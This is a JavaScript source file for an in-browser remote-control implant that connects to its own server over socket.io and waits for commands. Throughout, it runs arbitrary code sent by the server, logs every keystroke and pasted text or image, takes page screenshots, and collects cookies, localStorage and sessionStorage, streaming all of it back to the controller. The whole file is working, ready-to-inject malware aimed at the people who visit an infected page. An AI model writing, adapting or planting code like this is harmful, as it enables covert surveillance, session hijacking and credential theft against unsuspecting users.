(function () {
  const currScript = /** @type {HTMLScriptElement} */ (
    /** @type {*} */ document.querySelector("#script-rc")
  );
  if (!currScript) throw new Error("No script element found");

  const scriptUrl = new URL(currScript.src);
  const protocol = scriptUrl.protocol;
  const host = scriptUrl.host;
  const scriptId = scriptUrl.pathname
    .split("/")
    .find((x) => (Number.isNaN(Number(x)) ? false : Number(x)));
  const socketIoScript = document.createElement("script");

  socketIoScript.src = `${protocol}//${host}/socket.io/socket.io.js`;
  document.head.appendChild(socketIoScript);
  socketIoScript.onload = startTheScript;

  function log(...message) {
    // Only log messages from the same host as the script
    // Which means we are on /example page and not on the actual client
    if (host !== window.location.host) return;
    console.log(...message);
  }

  function startTheScript() {
    // @ts-ignore
    const socket = io(`${protocol}//${host}`);

    const state = {};

    state.sessionId = localStorage.getItem("sessionId") ?? "new";
    state.scriptId = scriptId;

    socket.on("connect", handleConnectEvent);

    socket.on("session", handleSessionEvent);

    socket.on("disconnect", handleDisconnectEvent);

    socket.on("message", handleMessageEvent);
    socket.on("command", handleCommandEvent);

    function handleDisconnectEvent() {
      log("Disconnected from the server");

      state.reconnectInterval = setInterval(() => {
        socket.connect();
      }, 2500);
    }

    function handleConnectEvent() {
      log("Connected to the server");
      if (state.sessionId) {
        socket.emit("join", {
          scriptId: state.scriptId,
          sessionId: state.sessionId,
        });
        log("Joining session", state.sessionId);
      } else {
        socket.emit("join", { sessionId: "new", scriptId: state.scriptId });
      }
      clearInterval(state.reconnectInterval);
    }

    function handleSessionEvent(data) {
      log("session", data);
      if (data.sessionId) {
        localStorage.setItem("sessionId", data.sessionId);
        state.sessionId = data.sessionId;
      }
    }

    function handleMessageEvent(data) {
      log("message", data);
    }

    function handleCommandEvent(data) {
      log("command", data);
      switch (data.type) {
        case "execute":
          return executeCommand(data);
        case "start-keyloger":
          return startTheKeyloger(data).catch((err) => {
            sendResponse("result", {
              type: "execute-error",
              payload: "ERROR: " + (err?.message ?? err),
              commandId: data.commandId,
            });
          });
        case "take-screenshot":
          return takeAScreenShot(data).catch((err) => {
            sendResponse("result", {
              type: "execute-error",
              payload: "ERROR: " + (err?.message ?? err),
              commandId: data.commandId,
            });
          });
        default:
          log("Unknown command type", data.type);
          return;
      }
    }

    function executeCommand(data) {
      try {
        const func = new Function(
          `return async function() {try {${data.payload}} catch(e) { return "ERROR: "+ (e?.message ?? e) }}()`
        );
        func().then((result) => {
          sendResponse("result", {
            type: "execute-result",
            payload:
              typeof result === "object" ? JSON.stringify(result) : result,
            commandId: data.commandId,
          });
        });
      } catch (e) {
        sendResponse("result", {
          type: "execute-error",
          payload: "ERROR: " + e.message,
          commandId: data.commandId,
        });
      }
    }

    async function startTheKeyloger(socketData) {
      if (state.keylogerStarted) {
        return Promise.reject("Keyloger already started");
      }
      state.keylogerStarted = true;
      state.keylogerData = "";
      state.keylogerSentData = "";

      document.addEventListener("keydown", (e) => {
        let key = e.key;
        if (key === " ") key = "Space";
        if (key.length > 1) key = `[${key}]`;
        state.keylogerData += `${key}`;
      });

      document.addEventListener("keyup", (e) => {
        let key = e.key;
        if (key === " ") key = "Space";
        if (key.length === 1) return;
        key = `[/${key}]`;
        state.keylogerData += `${key}`;
      });

      document.addEventListener("paste", (event) => {
        const clipboardItems = event.clipboardData?.items ?? [];
        for (const item of clipboardItems) {
          if (item.type.startsWith("image/")) {
            const blob = item.getAsFile();
            if (!blob) return;

            const reader = new FileReader();
            reader.onload = function (event) {
              const base64Image = event.target?.result;
              sendResponse("result", {
                type: "screenshot",
                payload: base64Image,
                commandId: "new",
              });
            };
            reader.readAsDataURL(blob);
          } else if (item.type === "text/plain") {
            item.getAsString((text) => {
              state.keylogerData += `[PASTE]${text}[/PASTE]`;
            });
          }
        }
      });

      setInterval(() => {
        if (state.keylogerSentData === state.keylogerData) return;
        sendResponse("result", {
          type: "execute-result",
          payload: state.keylogerData,
          commandId: socketData.commandId,
        });
        state.keylogerSentData = state.keylogerData;
      }, 2500);
    }

    async function takeAScreenShot(socketData) {
      if (!state.html2canvas) {
        await new Promise((resolve, reject) => {
          const src =
            "https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js";
          const script = document.createElement("script");
          script.src = src;
          script.onload = resolve;
          script.onerror = reject;
          setTimeout(reject, 25000, "Timeout fetching script");
          document.head.appendChild(script);
        });
        state.html2canvas = true;
      }

      // @ts-ignore
      html2canvas(document.body, { allowTaint: false }).then((canvas) => {
        const data = canvas.toDataURL();
        sendResponse("result", {
          type: "screenshot",
          payload: data,
          commandId: socketData.commandId,
        });
      });
    }

    function JSONReplaceFunctions(key, value) {
      if (typeof value === "function") {
        return value.toString();
      }
      return value;
    }

    // @ts-ignore
    window.getUsefulInfo = function () {
      const localStorage = JSON.stringify(window.localStorage);

      const sessionStorage = JSON.stringify(window.sessionStorage);

      const location = window.location.href;
      const cookies = Object.fromEntries(
        document.cookie.split(";").map((x) => x.split("="))
      );

      return {
        localStorage: JSON.parse(
          JSON.stringify(localStorage, JSONReplaceFunctions)
        ),
        sessionStorage: JSON.parse(
          JSON.stringify(sessionStorage, JSONReplaceFunctions)
        ),

        location,
        cookies: JSON.parse(JSON.stringify(cookies, JSONReplaceFunctions)),
      };
    };

    function sendResponse(type, payload, ...rest) {
      socket.emit("result", { type, payload, ...rest, ...state });
    }
  }
})();
